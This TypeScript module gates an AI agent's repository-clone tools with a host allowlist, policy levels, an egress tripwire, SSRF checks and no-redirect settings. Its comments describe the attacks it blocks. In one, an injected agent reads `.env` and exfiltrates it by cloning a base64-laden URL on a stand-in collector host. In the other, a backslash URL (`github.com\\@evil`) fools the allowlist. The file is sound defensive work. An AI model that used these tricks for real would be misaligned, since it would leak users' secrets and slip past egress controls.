import {
  type EgressIndicator,
  type ResolvedSecurityPolicy,
  egressIndicatorRefusal,
  findEgressIndicators,
} from '@bendyline/gezel';
import { SsrfError, assertPublicUrl } from '../utils/ssrf.js';

/**
 * Public git hosts a model may clone from wherever model git is on. Lockdown
 * is the coding posture, with GitHub read and write, so reviewing a public
 * repository there must keep working; any other host is the open web.
 */
export const KNOWN_GIT_HOSTS: ReadonlySet<string> = new Set([
  'github.com',
  'gitlab.com',
  'bitbucket.org',
  'codeberg.org',
  'gitea.com',
  'git.sr.ht',
]);

export type ModelCloneRefusal =
  | { status: 400 | 403; error: string }
  | { status: 403; error: string; indicators: EgressIndicator[] };

export interface ModelClonePlan {
  /**
   * The address exactly as the checks read it (`URL.href`). Callers hand git
   * this, never the raw string: WHATWG reads `https://github.com\\@evil/x.git`
   * as github.com while git and curl connect to `evil`.
   */
  url: string;
  /**
   * `--config` pairs to pass to `git clone`. They are written into the new
   * repository, so the later fetch, checkout and lazy blob fetches of a
   * partial clone keep them too.
   */
  cloneOptions: string[];
}

/**
 * Whether `fetch_repo` / `fetch_diff` may clone `rawUrl` for a model, and how.
 *
 * Their routes checked only the scheme, and the tools sat outside every
 * egress gate: an injected Meester could read `.env` through another gezel
 * and then clone `https://collector.example/<base64>.git` at lockdown, or
 * reach the LAN and cloud metadata. A known host needs model git (on at
 * lockdown, off at super-lockdown); any other host needs web services too.
 * Both pass the egress tripwire and the SSRF guard, and git follows no
 * redirect off a host that is not known.
 */
export async function planModelClone(
  rawUrl: string,
  policy: ResolvedSecurityPolicy,
  assertPublic: (url: string) => Promise<void> = assertPublicUrl,
): Promise<ModelClonePlan | ModelCloneRefusal> {
  // Characters that two URL parsers read differently. A backslash is a path
  // separator to WHATWG and part of the user name to curl, so the allowlist
  // saw github.com while git connected to the host after the `@`.
  // biome-ignore lint/suspicious/noControlCharactersInRegex: refusing control characters is the point
  if (/[\\\s\u0000-\u001f\u007f]/.test(rawUrl)) {
    return {
      status: 400,
      error: 'a repository address may not contain a backslash, a space or a control character',
    };
  }
  let url: URL;
  try {
    url = new URL(rawUrl);
  } catch {
    return { status: 400, error: 'invalid URL' };
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    return { status: 400, error: 'only http(s) URLs are allowed' };
  }
  if (url.username || url.password) {
    return { status: 400, error: 'a repository address may not carry a user name or password' };
  }
  if (!policy.allowModelGit) {
    return {
      status: 403,
      error: 'request denied: git is turned off for gezels at the current security level.',
    };
  }
  const host = url.hostname.toLowerCase().replace(/^www\./, '');
  const known = KNOWN_GIT_HOSTS.has(host) && url.protocol === 'https:' && url.port === '';
  if (!known && !policy.allowExternalServices) {
    return {
      status: 403,
      error: `request denied: at the current security level gezels clone only over https from ${[...KNOWN_GIT_HOSTS].join(', ')}. Other hosts need web services, which only Unrestricted allows.`,
    };
  }
  const indicators = findEgressIndicators(rawUrl);
  if (indicators.length > 0) {
    return { status: 403, error: egressIndicatorRefusal(indicators), indicators };
  }
  try {
    await assertPublic(url.href);
  } catch (err) {
    if (err instanceof SsrfError) return { status: 403, error: `request denied: ${err.message}` };
    throw err;
  }
  return {
    url: url.href,
    cloneOptions: [
      '--config',
      'protocol.allow=never',
      '--config',
      'protocol.https.allow=always',
      ...(url.protocol === 'http:' ? ['--config', 'protocol.http.allow=always'] : []),
      // A host that is not known could answer the first request with a
      // redirect to a private address the SSRF check never saw.
      ...(known ? [] : ['--config', 'http.followRedirects=false']),
    ],
  };
}

export function isModelCloneRefusal(
  plan: ModelClonePlan | ModelCloneRefusal,
): plan is ModelCloneRefusal {
  return 'error' in plan;
}
